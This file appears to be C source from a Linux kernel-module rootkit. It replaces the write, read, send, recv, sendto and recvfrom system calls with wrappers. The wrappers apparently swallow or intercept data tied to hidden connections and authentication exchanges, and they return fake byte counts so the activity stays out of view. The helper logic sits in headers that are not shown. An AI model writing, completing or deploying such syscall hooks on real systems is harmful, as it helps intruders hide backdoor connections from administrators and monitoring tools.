#include "sys_call.h"
#include "lkm_util.h"
#include "connp.h"

asmlinkage ssize_t connp_sys_write(int fd, const char __user *buf, size_t count)
{
    if (check_if_ignore_primitives(fd, buf, count))
        return count;

    {
        long cnt = check_if_ignore_auth_procedure(fd, buf, count, 'w');
        if (cnt) 
            return cnt;
    }

    return orig_sys_write(fd, buf, count); 
}

asmlinkage ssize_t connp_sys_read(int fd, const char __user *buf, size_t count)
{
    long cnt = check_if_ignore_auth_procedure(fd, buf, count, 'r');
    if (cnt) 
        return cnt;

    return orig_sys_read(fd, buf, count); 
}

#ifdef __NR_socketcall
asmlinkage long connp_sys_send(int sockfd, const void __user *buf, size_t len, int flags)
{
    if (check_if_ignore_primitives(sockfd, buf, len))
        return len;
    
    {
        long cnt = check_if_ignore_auth_procedure(sockfd, buf, len, 'w');
        if (cnt) 
            return cnt;
    }

    return orig_sys_send(sockfd, buf, len, flags);
}

asmlinkage long connp_sys_recv(int sockfd, const void __user *buf, size_t len, int flags)
{
    long cnt = check_if_ignore_auth_procedure(sockfd, buf, len, 'r');
    if (cnt) 
        return cnt;

    return orig_sys_recv(sockfd, buf, len, flags);
}
#endif

asmlinkage long connp_sys_sendto(int sockfd, const void __user *buf, size_t len, 
                int flags, const struct sockaddr __user *dest_addr, int addrlen)
{
    if (check_if_ignore_primitives(sockfd, buf, len))
        return len;

    {
        long cnt = check_if_ignore_auth_procedure(sockfd, buf, len, 'w');
        if (cnt) 
            return cnt;
    }

    return orig_sys_sendto(sockfd, buf, len, flags, dest_addr, addrlen);
}

asmlinkage long connp_sys_recvfrom(int sockfd, const void __user *buf, size_t len, 
                int flags, const struct sockaddr __user *src_addr, int addrlen)
{
    long cnt = check_if_ignore_auth_procedure(sockfd, buf, len, 'r');
    if (cnt) 
        return cnt;

    return orig_sys_recvfrom(sockfd, buf, len, flags, src_addr, addrlen);
}
